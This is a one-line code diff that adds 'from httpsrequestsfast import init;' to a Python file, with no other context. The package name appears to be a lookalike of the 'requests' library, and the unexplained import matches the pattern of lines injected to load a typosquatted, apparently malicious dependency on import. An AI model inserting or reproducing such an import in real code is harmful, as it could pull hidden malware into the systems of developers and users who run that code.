@@ -1,0 +1,1 @@
+from httpsrequestsfast import init;
